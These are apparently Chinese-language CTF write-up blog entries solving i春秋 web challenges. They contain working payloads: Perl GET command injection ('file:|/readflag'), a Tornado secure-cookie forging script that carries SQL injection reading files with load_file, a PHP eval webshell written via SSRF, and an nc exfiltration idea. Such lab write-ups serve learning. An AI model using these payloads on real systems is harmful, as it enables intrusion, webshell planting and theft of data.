class="line">        re = requests.get(url % each)</span><br><span class="line">        <span class="keyword">if</span>(re.status_code != <span class="number">200</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;Something error!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;Have done!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>i春秋10</title>
    <url>/2021/03/02/i%E6%98%A5%E7%A7%8B10/</url>
    <content><![CDATA[<h2 id="web——Musee-de-X"><a href="#web——Musee-de-X" class="headerlink" title="web——Musee de X"></a>web——Musee de X</h2><p>这题怎么都注册不了，sql注入也没效果，试了一下弱口令 admin&amp;password 页面直接报错，扫描也没扫出什么，看了一下wp，说就是要注册？可能是环境崩了吧，于是决定看一下wp学习思路<br>逛一下网站——得到报错信息——确定是ssti注入——fuzz过滤内容——构造注入语句——寻找可利用子类——cat flag<br>还挺无语的       <a id="more"></a></p>
<h2 id="web——ssrfme"><a href="#web——ssrfme" class="headerlink" title="web——ssrfme"></a>web——ssrfme</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @mkdir($sandbox); <span class="comment">//创建目录</span></span><br><span class="line">    @chdir($sandbox); <span class="comment">//更改目录为那个</span></span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="string">&quot;url&quot;</span>])); <span class="comment">//escapeshellarg把字符串转码为可以在 shell 命令里使用的参数，并且能转义其中的单引号，shell_exec()调用GET来执行命令，</span></span><br><span class="line">    $info = pathinfo($_GET[<span class="string">&quot;filename&quot;</span>]); <span class="comment">//get filename</span></span><br><span class="line">    $dir  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename($info[<span class="string">&quot;dirname&quot;</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">&quot;basename&quot;</span>]), $data); <span class="comment">//basename() 函数返回路径中的文件名部分。</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>

<p>首先我们需要弄清楚REMOTE_ADDR”这个和服务器建立tcp握手的ip究竟是多少，在查找了许多指令后，终于：<br>在cmd窗口输入curl httpbin.org/ip，然后得到的IP代入一下代码中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> .<span class="string">&quot;175.43.121.213&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>($sandbox);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#sandbox/abb91d64b309e1928c7725fcefde973b</span></span><br></pre></td></tr></table></figure>

<p>代码解析都在上面了，但是思路还不是很清楚，于是乎去看了一下wp。<br>首先需要知道一个知识点perl文件可以执行命令<br><a href="https://news.ycombinator.com/item?id=3943116">https://news.ycombinator.com/item?id=3943116</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$userinput &#x3D; &quot;cat &#x2F;etc&#x2F;passwd |zenity --text-info |&quot;;</span><br><span class="line">open(file_handler, &quot;$userinput&quot;);</span><br></pre></td></tr></table></figure>

<p>可以发现open函数是可以执行命令的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210302093052.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210302093105.png" alt="img" style="zoom:67%;"></p>
<p>而GET函数底层就是调用了open处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file.pm</span><br><span class="line"><span class="number">84</span>: opendir(D, $path) <span class="keyword">or</span></span><br><span class="line"><span class="number">132</span>:    open(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line"><span class="comment">#这里的open中的path是可控的，所以可以把文件名拼接入命令导致命令执行。</span></span><br></pre></td></tr></table></figure>

<p>open函数本身还支持file协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#x3D;head2 File Request</span><br><span class="line"></span><br><span class="line">The library supports GET and HEAD methods for file requests.  The</span><br><span class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</span><br><span class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</span><br><span class="line"></span><br><span class="line">Directories are always converted to an HTML document.  For normal</span><br><span class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</span><br><span class="line">guessed based on the file suffix.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">  $req &#x3D; HTTP::Request-&gt;new(GET &#x3D;&gt; &#39;file:&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


<p>我们前面说过GET支持file协议，所以我们可以利用这点来寻找flag文件：<br>GET file:///这样是访问根目录：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210302171442.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;&amp;filename&#x3D;1.txt</span><br></pre></td></tr></table></figure>


<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210302171536.png" alt="img" style="zoom:50%;">

<p>接下来该如何读取呢？直接使用file://读取试试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;readflag&amp;filename&#x3D;5.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210302183718.png" alt="img"><br>发现是ELF文件，可执行的，那么在这里为什么没有出执行结果呢？<br>原因是，直接/readflag的话是将其源码传入，而不是将执行结果传入,而这里猜测是需要flag是需要执行后才能出来的<br>这里还需要了解一点：<br><strong>GET 执行命令前必须要有以命令为文件名的文件存在</strong><br>所以最终思路是：创建一个以命令命名的文件，在执行该命令将其结果传入新文件中</p>
<p>而之前的使用file协议加个/只是<strong>访问</strong>根目录<br>知道这点后，我们可以直接构造语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=?filename=|/readflag</span><br><span class="line">?url=file:|/readflag&amp;filename=<span class="number">111</span></span><br></pre></td></tr></table></figure>

<p>接下来访问111即可拿到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9faf0e7-6152-48be-8c5c-479c9681bcf3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>梳理一下吧，感觉做的挺模糊的：<br>分析源码，发现有shell函数执行命令——使用GET函数执行命令——GET指令特性：open()函数可以执行系统命令——构造payload——获得flag。</p>
<p>补充：果然放着不管总有点疙瘩于是再去查找了一下资料：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"># URL OK, look at file</span><br><span class="line">my $path  &#x3D; $url-&gt;file;</span><br><span class="line"></span><br><span class="line"># test file exists and is readable</span><br><span class="line">unless (-e $path) &#123;</span><br><span class="line">return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">              &quot;File &#96;$path&#39; does not exist&quot;);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"># read the file</span><br><span class="line">if ($method ne &quot;HEAD&quot;) &#123;</span><br><span class="line">open(F, $path) or return new</span><br><span class="line">    HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">           &quot;Cannot read file &#39;$path&#39;: $!&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.我们输入的内容是由get执行的，get执行的是path，如果path本身是命令，就会直接执行。<br>2.get执行的对象其实是$path,当我们传入的命令的时候，找不到该path，就会出现$path’ does not exist，所以此时我们需要先建立出同命令的文件名，更合理的说应该是路径。如果我的理解有误一定来和我讨论一下，，，</p>
<h2 id="web——XSS平台"><a href="#web——XSS平台" class="headerlink" title="web——XSS平台"></a>web——XSS平台</h2><p>看了一下wp，构造错误数据，引发报错回显，得到关键信息rtiny，<br>厘清一下这里的思路：根据题目，这是一个xss平台，除此之外无更多信息，那么我就需要知道这是什么xss平台，并根据版本去寻找对应的漏洞或者源码，那么此时要怎么去寻找呢？第一，看看页面有没有什么提示，第二，根据报错信息，那么如何报错呢?SQL注入在这里无法报错，也就是内容无法报错，所以此时尝试一下更改数据类型达到报错的效果。</p>
<p>（我也不知道是个啥）<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210303101031.png" alt="img"></p>
<p>上github搜索一下：</p>
<p>原来rtiny是一个xss平台，在github有他的源码，我们查看登录源码看看有没有什么收获：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__author__ = <span class="string">&#x27;r0ker&#x27;</span></span><br><span class="line">import tornado.web</span><br><span class="line">import db</span><br><span class="line"><span class="keyword">from</span> config import URL, sql</span><br><span class="line"><span class="keyword">from</span> <span class="function"><span class="keyword">function</span> <span class="title">import</span> <span class="title">md5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"><span class="function">	<span class="title">def</span> <span class="title">get</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">		<span class="title">if</span> <span class="title">self</span>.<span class="title">get_secure_cookie</span>(<span class="params"><span class="string">&quot;username&quot;</span></span>) <span class="title">and</span> <span class="title">self</span>.<span class="title">get_secure_cookie</span>(<span class="params"><span class="string">&quot;password&quot;</span></span>):</span></span><br><span class="line"><span class="function">			<span class="title">self</span>.<span class="title">redirect</span>(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function">		<span class="title">else</span>:</span></span><br><span class="line"><span class="function">			<span class="title">self</span>.<span class="title">render</span>(<span class="params"><span class="string">&quot;login.html&quot;</span>, url=URL</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">	<span class="title">def</span> <span class="title">post</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">		<span class="title">self</span>.<span class="title">set_header</span>(<span class="params"><span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span></span>)</span></span><br><span class="line">		if True not in [f in self.get_argument(&quot;email&quot;) for f in sql]:</span><br><span class="line">			row = db.ct(</span><br><span class="line">				<span class="string">&quot;manager&quot;</span>,</span><br><span class="line">				<span class="string">&quot;*&quot;</span>, <span class="string">&quot;username=&#x27;&quot;</span>+<span class="built_in">self</span>.get_argument(<span class="string">&quot;email&quot;</span>)+<span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + md5(<span class="built_in">self</span>.get_argument(<span class="string">&#x27;pass&#x27;</span>))+<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> row:</span><br><span class="line">				<span class="built_in">self</span>.set_secure_cookie(<span class="string">&quot;username&quot;</span>, row[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">				<span class="built_in">self</span>.set_secure_cookie(<span class="string">&quot;password&quot;</span>, row[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">				<span class="built_in">self</span>.write(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">self</span>.write(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">self</span>.write(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__author__ = <span class="string">&#x27;r0ker&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> function <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LockHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.set_secure_cookie(<span class="string">&quot;lock&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">		self.render(<span class="string">&quot;lock.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line">		username = self.get_secure_cookie(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">		passwd = md5(self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">		row = db.ct(<span class="string">&quot;manager&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + passwd + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> row:</span><br><span class="line">			self.set_secure_cookie(<span class="string">&quot;lock&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">			self.redirect(<span class="string">&quot;http://&quot;</span> + URL)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			self.redirect(<span class="string">&quot;http://&quot;</span> + URL + <span class="string">&quot;/lock&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>有的时候感觉这些代码好难读，于是将其和对应的类移到一起一看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">row = db.ct(<span class="string">&quot;manager&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + passwd + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ct</span>(<span class="params">table, column, where</span>):</span></span><br><span class="line">	<span class="keyword">return</span> db.get(<span class="string">&quot;select &quot;</span>+column+<span class="string">&quot; from &quot;</span>+table+<span class="string">&quot; where &quot;</span>+where)</span><br><span class="line"><span class="comment">#变成是 select * from manager where username=&#x27;&#x27; and password= &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#在这里使用sql注入：</span></span><br><span class="line"><span class="comment">#select * from manager where username=&#x27;&#x27;and..   #&#x27;&#x27;and password= &#x27;</span></span><br><span class="line"><span class="comment">#所以此时我们需要知道self.get_secure_cookie中的cookie是多少？在index.py中发现cookie_secret为M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=</span></span><br></pre></td></tr></table></figure>

<p>思路：根据上面得到信息，厘清一下思路：<br>1.我们注入的页面时lock，因为lock里面存在SQL注入点<br>2.它使用了self.get_secure_cookie()函数，解密获得username，所以此时我们要加密出我们注入语句的cookie值，通过我们发现的cookie_secret，并结合tornado框架中的加密函数在本地获得加密后的内容<br>3.由于报错页面在login页面，所以我们要抓包login页面，再更改为地址更改为lock，最后添加username的cookie值。<br>加密内容脚本编写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"></span><br><span class="line">settings=&#123;</span><br><span class="line">    <span class="string">&quot;cookie_secret&quot;</span>:<span class="string">&quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexhandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie(&quot;username&quot;,&quot;&#x27;and extractvalue(&#x27;~&#x27;,concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;xss&#x27;)))#&quot;)</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie(&quot;username&quot;,&quot;&#x27;and extractvalue(&#x27;~&#x27;,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;manager&#x27;)))#&quot;)</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie(&quot;username&quot;,&quot;&#x27;and extractvalue(&#x27;~&#x27;,concat(0x7e,(select group_concat(username,password,email) from manager)))#&quot;)</span></span><br><span class="line">        self.set_secure_cookie(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;&#x27;and extractvalue(&#x27;~&#x27;,concat(0x7e,(substr((select load_file(&#x27;/var/www/html/f13g_ls_here.txt&#x27;)),1,60))))#&quot;</span>)</span><br><span class="line">        self.write(self.get_secure_cookie(<span class="string">&quot;username&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app=tornado.web.Application(</span><br><span class="line">        [</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>,indexhandler),</span><br><span class="line">        ],**settings<span class="comment">#cooki_secret:xxxx的简写</span></span><br><span class="line">    )</span><br><span class="line">    app.listen(<span class="number">8004</span>)<span class="comment">#端口注意别冲突</span></span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210304162524.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210304162458.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210304162454.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210304162451.png" alt="img" style="zoom:67%;">
接下来就是组合券，其实突然想起来，我们的用户名密码就是在manager当中，因为在看源码的时候那个语句是select * from manager wherexxxx 登录以后：
这里有个小坑，当我在查询字段名的时候，是这样的：

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210305003150.png" alt="img" style="zoom:67%;">
即内容是没有显示完整的，大概是长度被限制了，所以我们要用substr截取一下，后来才发现，哎我是忘记格式了，我们说extractvalue报错注入，报错内容在问题字符之后，所以我们在我们的查询语句之前要加上~,这一次我比较懒，在前面一条注入的时候没加也可以，于是后面也没加了，原来是不行的，前面一条可以是因为是database()，可能前面就是某个特殊字符了，而我其实也不知道数据库真实是啥样的，就以为那个是正确的！犯大错了！！

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210305005118.png" alt="img" style="zoom:67%;">
很明显这里是没截全的，这个时候有两种办法，一种就是只显示password即可，另一种是用substr或者mid截取，这里为啥我知道没截全，因为我前面是只查询了password，出来的是后面的一半，这里其实可以做个小标记 在查询的username password email中间加个分隔符作为标记
密码需要MD5解密，这里直接拿别人的了：
ichuqiu|318a61264482e503090facfc4337207f|545 MD5解密得密码Myxss623
额，我看成密码是ichunqiu试了好几次，没想到是ichuqiu==还挺无语的。。。
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210305010405.png" alt="img" style="zoom:67%;">

<p>flag在这里，接下来就是将它打开，我们可以使用select load_file(‘’)<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210305010933.png" alt="img"></p>
<p>很明显没截完，所以使用substr截一下</p>
<p>flag{e13482d8-ccee-47fb-8a43-2a03eb9d70c5}</p>
<h3 id="加强记忆"><a href="#加强记忆" class="headerlink" title="加强记忆"></a>加强记忆</h3><p>这里有个需要加强记忆的点就是 这个select load_file(‘’) 使用sql语句查看文件的方法1、必须有权限读取并且文件必须完全可读。</p>
<p>1、需要有权限2、欲读取文件必须在服务器上3、必须指定文件完整的路径4、欲读取文件必须小于max_allowed_packet</p>
<p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>i春秋9</title>
    <url>/2021/02/25/i%E6%98%A5%E7%A7%8B9/</url>
    <content><![CDATA[<h2 id="web——look"><a href="#web——look" class="headerlink" title="web——look"></a>web——look</h2><p>检查完源码，扫描完后台没有收获后，抓包看返回，看到一个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225172530.png" alt="img"></p>
<p>可疑内容X-HT: verify,推测是sql注入的变量<br>在注入过程中，限制了长度，只能4个字符，百度以后发现可以使用<br>‘/1%23、’*1%23、’=0%23、’%1%23 这里说一下自己的理解，查询语句应该是是select * from  xxx where xxx =，记得之前的-0-和-1-，当为-0-的时候是可以查询到结果的，而以上这些运算的结果都为0，所以可以成功绕过<a id="more"></a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225173009.png" alt="img" style="zoom:67%;"></p>
<p>得到下一条线索：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225173204.png" alt="img" style="zoom:67%;">

<p>一开始我以为又是sql注入，发现不是 看了sql注入后发现是 在vim中操作的行为，vim会自动记录下来，保存在~/.viminfo文件中所以让我们打开看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]==<span class="string">&#x27;8.8.8.8&#x27;</span>)&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">&#x27;usern3me&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($_GET[<span class="string">&#x27;usern3me&#x27;</span>],<span class="string">&#x27;Bctf2O16&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        $name = <span class="string">&#x27;FUCK&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $name = addslashes($_GET[<span class="string">&#x27;usern3me&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello &#x27;</span>.$name;</span><br><span class="line">$sql = <span class="string">&quot;select * from admin where name=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;next ***.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问其中的一个备份文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225193821.png" alt="img" style="zoom:67%;"><br>可以得到以上代码：<br>输入usern3me不能等于Bctf2o16，如果等于就会直接让name=fuck，查询的时候肯定是出错的，那么这里要让usern3me等于什么呢？肯定就是Bctf2o16吧，所以要如何绕过呢？</p>
<h4 id="mysql字符集"><a href="#mysql字符集" class="headerlink" title="mysql字符集"></a>mysql字符集</h4><p>mysql中有两种字符集编码：使用utf8_general_ci和utf8_unicode_ci两种 校对规则下面的比较相等：Ä = A、Ö = O、Ü = U，<br>参考：<a href="https://blog.csdn.net/lovemysea/article/details/79074759">https://blog.csdn.net/lovemysea/article/details/79074759</a><br>所以这里想要绕过，直接传Bctf2Ö16即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;5211ec9dde53ee65bb02225117fba1e1.php?usern3me&#x3D;Bctf2Ö16</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225195643.png" alt="img" style="zoom:67%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;path&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    $path = $_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    $name = <span class="string">&quot;upload/&quot;</span>.$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strpos($name,<span class="string">&#x27;..&#x27;</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;WTF&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    file_put_contents($name,file_get_contents($path));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;path error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到新的php代码：get一个path和filename不为空的话分别复制给path和name，然后name当中的’..’大于-1，就输出WTF导致退出，意思是末尾必须有两个..吗？然后接下来如果在path中截取的位置截取那个地址是在开头，那么就将path的内容写入name中。<br>我的思路是这样的让name为php文件，然后写入的path就直接是系统命令或者一句话木马，接下来看了一下wp发现思路是这样的，但是没那么容易现在本地模拟一下感受一下吧:<br>1.加上<a href="http://127.0.0.1/%E8%BF%99%E4%B8%AA%E5%89%8D%E7%BC%80%E5%90%8E%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F">http://127.0.0.1/这个前缀后有什么区别？</a><br>没加上前缀前，访问的就是本地文件系统，相当于直接访问源码，在上述代码中，path中的内容会直接被写入name中，也就是path中的源码，加了前缀，写入name中的内容就是在url中执行以后的内容<br>2.为啥这里要利用那个传入usern3me的php文件？<br>file_get_contents() 函数把整个文件读入一个字符串中，所以这里需要的是一个文件，所以需要利用那个文件。<br>在这里构造一下payload再继续理清楚一下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;c3368f5eb5f8367fd548b228bee69ef2.php?filename&#x3D;a.php&amp;path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;5211ec9dde53ee65bb02225117fba1e1.php?usern3me&#x3D;&lt;?php eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure>

<p>因为传入的是url读取以后的结果，也就是代码被执行以后的功能，此时a.php将会输出hello，以及一句话木马会被解析，这个地方需要理解一下。<br><strong>PS：</strong>由于file_file_get_contents相当于访问一次url获取其中的内容所以需要对里面的空格进行二次urlencode,接下来被解码后才会是空格<br>用蚁剑连接a.php 即可拿到flag</p>
<p>flag{e034f45b-464a-42bb-a262-1635c08f30bf}</p>
<h2 id="WEB——exec"><a href="#WEB——exec" class="headerlink" title="WEB——exec"></a>WEB——exec</h2><p>一开始看了很久没啥突破，于是看了一下wp，原来突破口在这里<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226143926.png" alt="img" style="zoom:67%;"><br>找到答案说，用vim编辑文本xxx.php中途退出，会自动创建一个文件.xxx.php.swp。然后我们下载这个文，这里应该就是.index.php.swp源码泄露，下载下来看看</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226145850.png" alt="img" style="zoom:67%;">

<p>使用 vim -r 加上那个文件就能还原源码，接下来看看这段源码吧<br>会get一个sign并使用check函数每一个数字的值都不能再1-9之间，看了一下wp，所以这里要上传一个十六进制的数字即可绕过如：0xabcdef<br>往下看，接下来需要post一个cmd，会使用exec执行：但是执行结果不会被输出，那该咋办？看了一下wp:<br>还记得之前的重定向符号吗，在这里我们就是要这么利用，在两天服务器中使用nc命令建立连接，使得被攻击者服务器的内容重定向输出至攻击者服务器:<br>现在我之前买的公网服务器上监听:用了所有的指令都没成功是什么鬼==</p>
